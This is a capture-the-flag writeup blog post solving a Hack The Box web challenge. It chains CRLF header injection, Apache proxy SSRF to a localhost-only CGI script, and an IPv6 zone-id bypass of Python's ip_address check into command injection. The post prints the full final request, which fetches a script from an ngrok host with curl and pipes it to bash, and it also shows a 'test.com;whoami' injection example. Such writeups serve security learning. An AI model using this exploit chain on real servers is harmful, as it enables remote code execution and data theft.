---
layout: post
title: "[HTB] Hackthebox Cyber Attack Writeup"
slug: "cyberattack"
date: "2025-03-29"
comments: false
categories:
  - hacking
tags:
  - ctf
  - hackthebox
  - 2025
  - Cyber Apocalypse
  - apache
  - ssrf
  - crlf
---

This is easy web challenge from [hackthebox.com] Cyber Apocalypse 2026 Tales from Eldoria. In this challenge we are provided with an `ip:port` and `source code` of the web app.

Navigating to the web app we are greeted with this page.
![index](/images/cyberAttack/index.png)

We have functionality to attack a `domain` and `ip` but only `domain` is enabled when we enter inputs.
![domain_test](/images/cyberAttack/attack_domain_test.com.png)

We can only input valid domain names with TLD, and entry of `localhost` doesn't work.
![localhost](/images/cyberAttack/attack_domain_localhost.png)

Since we are provided with the source code, let's dive right into it without wasting time on enumerating the site and its functionalities.

In `apache/apache2.conf`.

```conf
ServerName CyberAttack

AddType application/x-httpd-php .php

<Location "/cgi-bin/attack-ip">
Order deny,allow
Deny from all
Allow from 127.0.0.1
Allow from ::1
</Location>
```

We can see that the path `/cgi-bin/attack-ip` is only accessible from localhost and all attempts to access it will be denied as stated in the `apache2.conf`.

![403](/images/cyberAttack/403_attack_ip.png)

Now let's analyse index page at `/src/index.php`
```javascript
...
const isLocalIP = (ip) => {
return ip === "127.0.0.1" || ip === "::1" || ip.startsWith("192.168.");
};
// Get the user's IP address
const userIP = "<?php echo $_SERVER['REMOTE_ADDR']; ?>";
// Enable/disable the "Attack IP" button based on the user's IP
const attackIPButton = document.getElementById("attack-ip");
// Enable buttons if required fields are filled
const enableButtons = () => {
const playerName = document.getElementById("user-name").value;
const target = document.getElementById("target").value;
const attackDomainButton = document.getElementById("attack-domain");
...
```

`userIP` is taken and buttons are enabled based on the ip. Nothing much to go on here. We see some calls to `cgi-bin/*` so let's shift our focus on those first.

For the file `src/cgi-bin/attack-domain`
```python
#!/usr/bin/env python3
import cgi
import os
import re  

def is_domain(target):
    return re.match(r'^(?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.[a-zA-Z]{2,63}$', target)

form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')

if not name or not target:
    print('Location: ../?error=Hey, you need to provide a name and a target!')
elif is_domain(target):
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {target}')
    print(f'Location: ../?result=Succesfully attacked {target}!')
else:
    print(f'Location: ../?error=Hey {name}, watch it!')
print('Content-Type: text/html')
print()
```

We can see that it takes two parameters from the http request `name` and `target` and then the `target` parameter is passed through `is_domain(target)` function which uses a regex match to check if it a valid TLD address. So basically `test.com` works but `sub.test.com`,`-test.com`, `test.com/folder` and other `urls` don't work and an error is shown.

If the domain name check passes then the input is used to call a system command using `os.popen` which calls `ping` on the target. This is a serious security flaw if somehow the `regex` is bypassed. For example an attacker could gain `RCE` with payloads like `test.com;whoami`. A reflected `XSS` can also be triggered since the `name` is printed if an error occurs. 

- A possible RCE if regex is bypassed on the domain name.
- Reflected XSS on name parameter.

Let's proceed further and analyse the next file `src/cgi-bin/attack-ip`.

```python
#!/usr/bin/env python3
import cgi
import os
from ipaddress import ip_address  

form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')
 
if not name or not target:
    print('Location: ../?error=Hey, you need to provide a name and a target!')
try:
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {ip_address(target)}')
    print(f'Location: ../?result=Succesfully attacked {target}!')
except:
    print(f'Location: ../?error=Hey {name}, watch it!')
print('Content-Type: text/html')
print()
```

This is similar to our `attack-domain` python script but this time the target is an IP address and it uses an import of `ip_address` which check if the `target` is a valid IP address. This code also has the same vulnerability to get `RCE` since it uses `os.popen` to run a `ping` on the `target`. 

While trying to bypass the `regex` on `attack-domain` does not yield us anything, we  shift our focus on the `name` parameter.

We can see that when an error is triggered, the `name` parameter is also returned in the `http` response headers.

![header_error](/images/cyberAttack/header_error.png)

So we can try other vulnerabilities. 

We can try `crlf` to inject additional headers.
![injected_headers](/images/cyberAttack/injected_headers.png)

After some researching we find this wonderful blog post on apache's vulnerability by [orangetsai](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/) 
![blog_excerpt](/images/cyberAttack/blog_excerpt.png)

We test the exploit we got from the blog.
![proxy](/images/cyberAttack/proxy_works.png) 

We are able to cause ssrf on the server.

We try it on the `attack-ip` but got error.
![attack_ip](/images/cyberAttack/trying_ssrf_attack_ip.png)

So we url encode the characters.
![url_encode](/images/cyberAttack/url_encode.png)

```http
GET /cgi-bin/attack-domain?target=test&name=test%0d%0aLocation:/ooo%0d%0aContent-Type:proxy:http%3a%2f%2f127.0.0.1%2fcgi-bin%2fattack-ip%3ftarget%3d10.10.10.10%26name=test2%0d%0a%0d%0a
```

We now have a way to perform `SSRF` to call `attack-ip` but we also have to find a way to bypass the `ip_address()` check in the code to execute any code.

```python
try:
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {ip_address(target)}')
    print(f'Location: ../?result=Succesfully attacked {target}!')

```

After some digging around on the `ip_address()` in python, we can see that in ipv6 we can insert zone id using `%` character.  So `::1%test` is also a valid ipv6 entry.

![bypass](/images/cyberAttack/bypass_ipAddress.png)
We are able to bypass the check get code execution.

Let's proceeds further.
```entry.sh
#!/bin/bash
mv /flag.txt /flag-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 15).txt

# Start supervisord
/usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf
```

We can see that the flag name is randomised.

We also know that that we won't get output of the command executed from the server so we can either get a reverse shell or get the contents of the flag as a web request or write it in the webroot folder and access it from there. But in our attack input we cannot use `/` and neither can we `base64` encode since `url` are not character sensitive. So we have to find a way to execute our payload.

Since we are not using any VPS and don't have a static public IP, we will use `ngrok` to make our host machine publicly available.

![ngrok](/images/cyberAttack/ngrok_online.png)

We create a `python` http server on our host and get a callback to our machine.
In `ngrok` free tier there is a page which block and then redirects our request so we have to user `curl --location` in our request to follow the request. Just a minor inconvenience.

![curl_ngrok](/images/cyberAttack/curl_ngrok.png)

We get a request on our python server and can see that our `RCE` has been successfully achieved.
![python_http](/images/cyberAttack/python_http_server.png)

Now let's host our malicious code and host it on our server and since `/` cannot be used, we will use the `index.html` to host our code and `pipe` it to `bash`.

```index.html
cat /flag* > /var/www/html/pwned.txt
```

So our request will look like this.
```http
GET /cgi-bin/attack-domain?target=error&name=test%0d%0aLocation:/ooo%0d%0aContent-Type:proxy:http%3a%2f%2f127.0.0.1%2fcgi-bin%2fattack-ip%3ftarget%3d::1%$(curl%2b--location%2b842c-152-58-7-106.ngrok-free.app|bash)%26name=test2%0d%0a%0d%0a 
```

![burp_success](/images/cyberAttack/burp_success.png)

The code got successfully executed and we got our flag by navigating to `/pwned.txt`.
![pwned](/images/cyberAttack/pwned.png)

This easy challenge from hackthebox was actually difficult and a fun challenge to solve. 

> Overall 42/77 Challenges solved from the team. Not bad!

![certificate](/images/cyberAttack/certificate_of_participation.png)